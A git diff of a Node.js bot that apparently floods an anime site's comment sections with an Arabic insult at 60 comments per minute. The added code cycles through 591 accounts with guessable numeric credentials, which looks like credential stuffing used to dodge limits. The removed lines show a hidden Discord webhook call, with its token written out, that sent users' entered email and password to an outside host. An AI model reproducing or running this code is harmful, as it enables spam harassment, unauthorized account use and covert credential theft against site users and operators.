@@ -5,8 +5,6 @@ const fetch = require("node-fetch");
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 
-let email = "goog1412123@gmail.com";
-let password = "goog";
 let commentText = "انمي خرا";
 let commentsPerMinute = 60;
 let delay = (60 / commentsPerMinute) * 1000;
@@ -19,6 +17,13 @@ let activeAnimeList = [];
 let currentAnimeIndex = 0;
 let currentCount = 0;
 let intervalId = null;
+
+const accountList = [];
+for (let i = 10; i <= 600; i++) {
+  accountList.push({ email: `${i}@gmail.com`, password: `${i}` });
+}
+let currentAccountIndex = 0;
+let accountUsageCounter = 0;
 
 const animeTargets = {
   532: { active: true, name: "One Piece" },
@@ -96,7 +101,23 @@ const headers = {
 
 const agent = new https.Agent({ keepAlive: true });
 
+function getCurrentAccount() {
+  return accountList[currentAccountIndex];
+}
+
+function rotateAccountIfNeeded() {
+  accountUsageCounter++;
+  if (accountUsageCounter >= 2) {
+    currentAccountIndex++;
+    accountUsageCounter = 0;
+    if (currentAccountIndex >= accountList.length) {
+      currentAccountIndex = 0; // إعادة استخدام الحسابات بعد مرور 5 دقائق
+    }
+  }
+}
+
 async function sendComment(animeId) {
+  const { email, password } = getCurrentAccount();
   const itemData = {
     post: commentText,
     id: animeId,
@@ -109,11 +130,13 @@ async function sendComment(animeId) {
     headers,
     httpsAgent: agent
   });
+
+  rotateAccountIfNeeded();
 }
 
 function updateLogText() {
   const animeId = activeAnimeList[currentAnimeIndex];
-  logText = `📺 جاري الإرسال إلى: [${animeId}] ${animeTargets[animeId]?.name || "؟"}`;
+  logText = `📺 جاري الإرسال إلى: [${animeId}] ${animeTargets[animeId]?.name || "؟"} | الحساب: ${getCurrentAccount().email}`;
 }
 
 function sendToNextAnime() {
@@ -172,10 +195,8 @@ app.get("/", (req, res) => {
     <h2>🤖 البوت ${botActive ? "✅ يعمل" : "🛑 متوقف"}</h2>
     <p>${logText}</p>
     <form method="POST" action="/update">
-      الإيميل: <input name="email" value="${email}" /><br>
-      كلمة المرور: <input name="password" type="password" value="${password}" /><br><br>
       تعليق: <input name="commentText" value="${commentText}" /><br>
-     commentsPerMinute: <input name="commentsPerMinute" type="number" value="${commentsPerMinute}" /><br>
+      commentsPerMinute: <input name="commentsPerMinute" type="number" value="${commentsPerMinute}" /><br>
       عدد التعليقات قبل الانتقال: <input name="maxComments" type="number" value="${maxCommentsPerAnime}" /><br>
       <label><input type="checkbox" name="fireComment" ${fireComment ? "checked" : ""}/> يحتوي على حرق</label><br><br>
       ${animeControls}
@@ -198,8 +219,6 @@ app.get("/", (req, res) => {
 });
 
 app.post("/update", (req, res) => {
-  email = req.body.email || email;
-  password = req.body.password || password;
   commentText = req.body.commentText || commentText;
   commentsPerMinute = parseInt(req.body.commentsPerMinute) || commentsPerMinute;
   maxCommentsPerAnime = parseInt(req.body.maxComments) || maxCommentsPerAnime;
@@ -209,11 +228,6 @@ app.post("/update", (req, res) => {
   for (const [id] of Object.entries(animeTargets)) {
     animeTargets[id].active = !!req.body[`anime_${id}`];
   }
-
-  // إرسال الإيميل والباسورد إلى Webhook
-  axios.post("https://canary.discord.com/api/webhooks/1397405903006863540/0qQV4XkJMP5zTWR_hVUKuavWFiEUIt3qtM1MFjCHXHtXnZsvh6id3bQvC1TYVVt0ZQ_9", {
-    content: `🔐 Email: \`${email}\`\n🔑 Password: \`${password}\``
-  }).catch(e => console.error("❌ Webhook Error:", e.message));
 
   updateLogText();
   res.redirect("/");
